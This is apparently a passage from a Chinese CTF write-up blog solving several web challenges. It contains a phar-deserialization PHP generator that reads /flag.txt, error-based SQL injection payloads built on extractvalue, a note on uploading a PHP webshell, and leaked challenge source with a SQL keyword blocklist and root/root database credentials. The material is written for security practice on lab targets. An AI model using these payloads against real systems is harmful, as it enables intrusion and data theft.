<p>我把三个类中重要的部分列出来了，首先是User类里有个destruct析构函数，会去调用db里的close方法，然后FIlelist有个call魔术方法，作用是将<code> $file-&gt;$func();</code>的结果保存到result里，FIle类里又有close方法<br>那pop链就清晰了：<code>__destruct(User)-&gt;__call(Filelist)-&gt;close(File)</code>,最后通过Filelist类里的析构函数输出结果<br>但是还需要注意一些细节：<br>dowload.php和delete.php都实例化了File类，并且可以触发phar反序列化，但download.php中设置了open_basedir访问权限设置，不让我们读取根目录下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932771157-8463c977-504c-4511-8b4f-42fa0a8b0d98.png#averageHue=%23313a44&clientId=u219e3420-601a-4&from=paste&height=168&id=u19b2f5a6&name=image.png&originHeight=210&originWidth=839&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33667&status=done&style=none&taskId=u63f521c9-18a2-4d02-a35c-4d3c3073388&title=&width=671.2" alt="image.png"><br>而且根据经验，不让我们读取根目录，filename里又不能有flag，那flag文件就应该是<code>/flag或者/flag.txt</code>之类的<br>download.php无法去利用，那就利用delete.php：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932857240-7c91cb01-4939-4913-8725-b497077c417c.png#averageHue=%23323b44&clientId=u219e3420-601a-4&from=paste&height=360&id=uf20f488f&name=image.png&originHeight=450&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54732&status=done&style=none&taskId=uec349e85-475e-4a93-a5ab-7dd44998060&title=&width=660.8" alt="image.png"><br>这里是没设置open_basedir的，所以就利用这个，那就开始生成phar文件:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>应该不难看懂，就是用delete.php去触发phar，phar里利用File类里的close去读取flag.txt<br>最终上传phar文件改后缀名为png，然后点删除抓包，改文件名字：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932946480-55e96eb5-b5d2-4399-b966-8ef71ba9c730.png#averageHue=%23f5f5f4&clientId=u219e3420-601a-4&from=paste&height=282&id=u4fffe90c&name=image.png&originHeight=353&originWidth=1274&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54907&status=done&style=none&taskId=u9ac412b8-a6f8-49aa-8d91-b5c4ea138d8&title=&width=1019.2" alt="image.png"><br>就可以看到flag了</p>
<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>考点：FUZZ,报错注入，字符串逆序<br>手测fuzz后发现ban了<code>and,sleep,</code>,空格<code>,没有ban掉or和extractvalue 那就是报错注入了： </code>1”or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;database()),0x7e)))#<code>![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667025463833-d222da03-7005-4f83-8cb3-ce35efd0f0f6.png#averageHue=%23f6f5f4&amp;clientId=u035787b4-56ba-4&amp;from=paste&amp;height=158&amp;id=u5f18ef7c&amp;name=image.png&amp;originHeight=197&amp;originWidth=463&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=6844&amp;status=done&amp;style=none&amp;taskId=u2b13bb20-5a99-4ec3-9309-1f6b076c31b&amp;title=&amp;width=370.4) 然后再去爆字段：</code>1”or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x3D;’flag’),0x7e)))#<code>![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667025536987-5b15742c-4a2f-4eb0-a039-a136fb1af293.png#averageHue=%23fafaf9&amp;clientId=u035787b4-56ba-4&amp;from=paste&amp;height=215&amp;id=u99617c77&amp;name=image.png&amp;originHeight=269&amp;originWidth=559&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=7416&amp;status=done&amp;style=none&amp;taskId=u78786f2f-0dc6-4c04-9fbc-406278a08a6&amp;title=&amp;width=447.2) 最后得到flag：</code>1”or(extractvalue(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e)))#<code>： ![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667025610989-fd124940-d304-4fad-95a4-628b316ebbd4.png#averageHue=%23fafaf9&amp;clientId=u035787b4-56ba-4&amp;from=paste&amp;height=190&amp;id=u0d575c09&amp;name=image.png&amp;originHeight=238&amp;originWidth=742&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=8922&amp;status=done&amp;style=none&amp;taskId=ub0ed6f3f-92ee-4e4e-bf25-25b8195129b&amp;title=&amp;width=593.6) 草！ 在user表里： ![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667025676309-112ea022-3548-4afc-bae1-afc484d5b1e5.png#averageHue=%23faf9f9&amp;clientId=u035787b4-56ba-4&amp;from=paste&amp;height=95&amp;id=ued5e7e11&amp;name=image.png&amp;originHeight=119&amp;originWidth=754&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=5134&amp;status=done&amp;style=none&amp;taskId=uc1622355-d3f0-4113-a1c6-07a46b29833&amp;title=&amp;width=603.2) 这边上面的图有长度限制，但是right，left，mid都给ban了，我们用正则 </code>1”or(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp’^flag’),0x7e)))#<code>： ![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667027590219-c94f878a-561d-44e7-88fc-ab19e959dced.png#averageHue=%23faf9f8&amp;clientId=uc7736ba4-0486-4&amp;from=paste&amp;height=165&amp;id=u43943023&amp;name=image.png&amp;originHeight=206&amp;originWidth=617&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=7918&amp;status=done&amp;style=none&amp;taskId=u65e9fcea-371e-4cd7-b12e-ee87a29c42e&amp;title=&amp;width=493.6) 最后： </code>1”or(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp’^flag’)),0x7e)))#<code> ![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667027426865-a6398152-e3d0-429c-a329-cae377f92fbb.png#averageHue=%23faf9f8&amp;clientId=uc7736ba4-0486-4&amp;from=paste&amp;height=169&amp;id=u4ea2af0a&amp;name=image.png&amp;originHeight=211&amp;originWidth=788&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=10385&amp;status=done&amp;style=none&amp;taskId=ue69a98e6-5e50-43ae-bc19-243cbb0c998&amp;title=&amp;width=630.4) ![image.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1667027595952-9a45aced-2b14-49b4-89bb-7f9b92e365db.png#averageHue=%23fefefe&amp;clientId=uc7736ba4-0486-4&amp;from=paste&amp;height=343&amp;id=u9d442441&amp;name=image.png&amp;originHeight=429&amp;originWidth=670&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16286&amp;status=done&amp;style=none&amp;taskId=u569abe0e-02ed-4c19-9cc4-310bd5e19bd&amp;title=&amp;width=536) 所以flag：</code>flag{6a71f0e9-fe71-4fdb-8211-c34410558b83}&#96;</p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>考点：文件上传<br>我无语了，这题逼格看起来很高，实际上就是一坨屎<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667063040857-3f7fcb07-7e22-44a3-bb1b-cd821494eaf1.png#averageHue=%236e6967&clientId=u886ab313-403c-4&from=paste&height=543&id=u40313277&name=image.png&originHeight=679&originWidth=1908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=702175&status=done&style=none&taskId=ucd7c7426-269e-4440-b10f-c9cfbe24a09&title=&width=1526.4" alt="image.png"><br>注册界面，什么都没有<br>先注册一个账号，然后登入看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667063107696-6b5cfeeb-430f-4060-b8e7-0bde31e9090c.png#averageHue=%2320311d&clientId=u886ab313-403c-4&from=paste&height=592&id=ub748d43f&name=image.png&originHeight=740&originWidth=1734&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1436373&status=done&style=none&taskId=u034135aa-0a23-462b-a80e-51acf9fa2b3&title=&width=1387.2" alt="image.png"><br>可以上传头像，一开始上传个图片，给我弹出上传不了，我还以为是什么高级文件上传<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667063170608-b1e38a8d-f39e-4c15-89ef-22c54ba397cd.png#averageHue=%23f6f3f3&clientId=u886ab313-403c-4&from=paste&height=210&id=u696a9864&name=image.png&originHeight=262&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59563&status=done&style=none&taskId=u6deb07fb-f48d-45b1-9021-304ff4ad5a2&title=&width=1023.2" alt="image.png"><br>会给你修改文件名，上传png木马后不能上传htaccess或者是.user.ini文件，就卡在这里的时候，我试了一下既然是文件头验证，那php后缀名可不可以，不试不知道，一试吓一跳：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667063224130-0e2e47f0-1053-43e6-9016-7a90daafecf9.png#averageHue=%23fbfcdd&clientId=u886ab313-403c-4&from=paste&height=84&id=u2d2bf6de&name=image.png&originHeight=105&originWidth=1443&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15438&status=done&style=none&taskId=u9a292f9b-b038-4bd5-8652-b7aeb3f37fb&title=&width=1154.4" alt="image.png"><br>直接rce，无语了，逼格瞬间拉低</p>
<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>考点：SQL注入二次注入，代码审计<br>这题有毒，真的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667116542226-0b7c582d-2f13-4166-9acd-062cb963ff20.png#averageHue=%2347544d&clientId=u4aebc35d-58a1-4&from=paste&height=758&id=u96ccf8ee&name=image.png&originHeight=947&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3264249&status=done&style=none&taskId=u9446b06a-d847-455f-9154-b7d8bfdc3b5&title=&width=1536" alt="image.png"><br>一个购买界面，里面有提交订单，修改订单，删除订单，查询订单四个功能，查看源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667116567936-154b2490-3c51-4553-a0a8-2a1055ae9254.png#averageHue=%23fcfbfb&clientId=u4aebc35d-58a1-4&from=paste&height=78&id=u9c8cef2d&name=image.png&originHeight=98&originWidth=348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3948&status=done&style=none&taskId=ue38eecc4-76ba-48b4-abe2-10ad76a076d&title=&width=278.4" alt="image.png"><br>会在最底下发现一个参数<code>file</code>，经过测试发现可以读取源码，用filter协议base64编码再读出来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;确认订单&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">class</span>=&quot;<span class="title">logo</span>&quot; <span class="title">src</span>=&quot;./<span class="title">assets</span>/<span class="title">img</span>/<span class="title">logo</span>-<span class="title">zh</span>.<span class="title">png</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure>
